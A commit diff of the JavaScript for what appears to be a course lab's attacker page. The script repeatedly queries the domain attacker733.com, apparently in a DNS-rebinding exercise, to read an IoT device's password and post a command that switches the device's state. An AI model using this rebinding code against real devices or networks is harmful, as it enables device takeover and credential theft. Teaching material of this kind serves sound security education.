91b107e0a0f9775af3a49efa0a3773538fea3647
rezvanm <mireshghi.rezvan@gmail.com>
2022-04-10 13:00:05 -0700

    Update main.js

--- apps/cmpt733attacker/templates/js/main.js
+++ apps/cmpt733attacker/templates/js/main.js
@@ -1,39 +1,39 @@
-let INTERVAL_LENGTH = 10; 
-let TEMPERATURE = 88 
+let INTERVAL_LENGTH = 10;
+let STATE = "off";
 
 let url_prefix = 'http://www.attacker733.com'
 
 function launchAttack() {
-   console.log('Launch the Attack!!');
-   $.get(url_prefix + '/password', function(data) {
-      if ('StillMe' === data) {
-        console.log('Failed: Still talking to the attacker\'s web server!!');
-        $('#pwd-err').show();
-        $('#pwd-iot').hide();
-      } else {
-        console.log('Great, now I am talking to the IoT device!!');
-        $('#pwd-err').hide();
-        $('#pwd-iot').show();
-      }
+  console.log('Launch the Attack!!');
+  $.get(url_prefix + '/password', function (data) {
+    if ('StillMe' === data) {
+      console.log('Failed: Still talking to the attacker\'s web server!!');
+      $('#pwd-err').show();
+      $('#pwd-iot').hide();
+    } else {
+      console.log('Great, now I am talking to the IoT device!!');
+      $('#pwd-err').hide();
+      $('#pwd-iot').show();
+    }
 
-      $.post(url_prefix + '/temperature?value=' + TEMPERATURE
-                        + '&password=' + data.password, 
-             function(data) { });
-   });
+    $.post(url_prefix + '/state?value=' + STATE
+      + '&password=' + data.password,
+      function (data) { });
+  });
 }
 
 function countDown() {
-    $('#currentCount').html("<h2>"+ count +"</h2>");
-    if (count === 0) {
-        launchAttack();
-        count = INTERVAL_LENGTH;
-    } else if (count == 5) {
-        $('#pwd-err').hide();
-        $('#pwd-iot').hide();
-        count--;
-    } else {
-        count--;
-    }
+  $('#currentCount').html("<h2>" + count + "</h2>");
+  if (count === 0) {
+    launchAttack();
+    count = INTERVAL_LENGTH;
+  } else if (count == 5) {
+    $('#pwd-err').hide();
+    $('#pwd-iot').hide();
+    count--;
+  } else {
+    count--;
+  }
 }
 
 let count = INTERVAL_LENGTH;
